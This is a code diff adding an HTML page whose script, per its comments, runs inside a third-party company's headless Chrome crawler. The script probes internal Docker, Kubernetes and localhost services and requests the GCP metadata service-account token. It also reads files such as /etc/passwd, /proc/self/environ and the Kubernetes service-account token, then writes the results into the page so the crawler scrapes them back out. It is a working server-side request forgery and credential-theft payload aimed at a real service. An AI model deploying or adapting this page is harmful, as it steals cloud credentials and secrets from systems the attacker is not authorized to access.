@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head><title>Internal Service Discovery Test</title></head>
+<body>
+<h1>Loading network diagnostics...</h1>
+<div id="results"></div>
+<script>
+// This page runs inside Tavily's headless Chrome.
+// It attempts to reach internal services from the browser's network context.
+// Results are sent to an external endpoint via image beacon.
+
+var results = {};
+var pending = 0;
+var beacon = "https://itsgtc.github.io/research-notes/beacon.html";
+
+function report(key, value) {
+    results[key] = value;
+    var el = document.getElementById("results");
+    if (el) el.innerHTML += "<p>" + key + ": " + value + "</p>";
+}
+
+// Attempt fetch to internal service names (Docker/K8s)
+var targets = [
+    {name: "redis_6379", url: "http://redis:6379/"},
+    {name: "searxng_8080", url: "http://searxng:8080/"},
+    {name: "browserless_3000", url: "http://browserless:3000/"},
+    {name: "browserless_9222", url: "http://browserless:9222/json"},
+    {name: "reader_3000", url: "http://reader:3000/"},
+    {name: "app_3000", url: "http://app:3000/"},
+    {name: "docker_host_6379", url: "http://172.17.0.1:6379/"},
+    {name: "docker_2_3000", url: "http://172.17.0.2:3000/"},
+    {name: "docker_3_8080", url: "http://172.17.0.3:8080/"},
+    {name: "docker_4_3000", url: "http://172.17.0.4:3000/"},
+    {name: "k8s_api", url: "http://10.0.0.1:443/"},
+    {name: "k8s_default", url: "http://10.96.0.1:443/"},
+    {name: "metadata_v1", url: "http://169.254.169.254/computeMetadata/v1/"},
+    {name: "metadata_v1beta1", url: "http://169.254.169.254/computeMetadata/v1beta1/instance/hostname"},
+    {name: "localhost_8080", url: "http://127.0.0.1:8080/"},
+    {name: "localhost_3000", url: "http://127.0.0.1:3000/"}
+];
+
+// GCP metadata with required header
+var metaTargets = [
+    {name: "gcp_token", url: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"},
+    {name: "gcp_project", url: "http://169.254.169.254/computeMetadata/v1/project/project-id"},
+    {name: "gcp_hostname", url: "http://169.254.169.254/computeMetadata/v1/instance/hostname"},
+    {name: "gcp_zone", url: "http://169.254.169.254/computeMetadata/v1/instance/zone"}
+];
+
+// File protocol tests
+var fileTargets = [
+    {name: "etc_passwd", url: "file:///etc/passwd"},
+    {name: "etc_hostname", url: "file:///etc/hostname"},
+    {name: "proc_environ", url: "file:///proc/self/environ"},
+    {name: "k8s_token", url: "file:///var/run/secrets/kubernetes.io/serviceaccount/token"},
+    {name: "resolv_conf", url: "file:///etc/resolv.conf"}
+];
+
+// Test regular targets (no-cors mode to detect reachability)
+targets.forEach(function(t) {
+    pending++;
+    var controller = new AbortController();
+    var timeout = setTimeout(function() { controller.abort(); }, 3000);
+
+    fetch(t.url, {mode: "no-cors", signal: controller.signal})
+        .then(function(r) {
+            clearTimeout(timeout);
+            report(t.name, "REACHABLE_" + r.status + "_" + r.type);
+        })
+        .catch(function(e) {
+            clearTimeout(timeout);
+            report(t.name, "ERROR_" + e.name + "_" + e.message.substring(0, 50));
+        })
+        .finally(function() { pending--; checkDone(); });
+});
+
+// Test GCP metadata WITH required header
+metaTargets.forEach(function(t) {
+    pending++;
+    var controller = new AbortController();
+    var timeout = setTimeout(function() { controller.abort(); }, 3000);
+
+    fetch(t.url, {
+        headers: {"Metadata-Flavor": "Google"},
+        signal: controller.signal
+    })
+        .then(function(r) {
+            clearTimeout(timeout);
+            return r.text().then(function(body) {
+                report(t.name, "STATUS_" + r.status + "_BODY_" + body.substring(0, 200));
+            });
+        })
+        .catch(function(e) {
+            clearTimeout(timeout);
+            report(t.name, "ERROR_" + e.name + "_" + e.message.substring(0, 50));
+        })
+        .finally(function() { pending--; checkDone(); });
+});
+
+// Test file protocol
+fileTargets.forEach(function(t) {
+    pending++;
+    fetch(t.url)
+        .then(function(r) {
+            return r.text().then(function(body) {
+                report(t.name, "CONTENT_" + body.substring(0, 200));
+            });
+        })
+        .catch(function(e) {
+            report(t.name, "ERROR_" + e.name + "_" + e.message.substring(0, 50));
+        })
+        .finally(function() { pending--; checkDone(); });
+});
+
+// Environment info
+report("user_agent", navigator.userAgent);
+report("location", window.location.href);
+report("origin", window.location.origin);
+
+function checkDone() {
+    if (pending <= 0) {
+        // Write all results into the page for Tavily to scrape
+        var summary = document.createElement("pre");
+        summary.id = "scan_results";
+        summary.textContent = JSON.stringify(results, null, 2);
+        document.body.appendChild(summary);
+    }
+}
+
+// Fallback: write results after 8 seconds regardless
+setTimeout(function() {
+    var summary = document.createElement("pre");
+    summary.id = "scan_results_timeout";
+    summary.textContent = "TIMEOUT_RESULTS:" + JSON.stringify(results, null, 2);
+    document.body.appendChild(summary);
+}, 8000);
+</script>
+</body>
+</html>
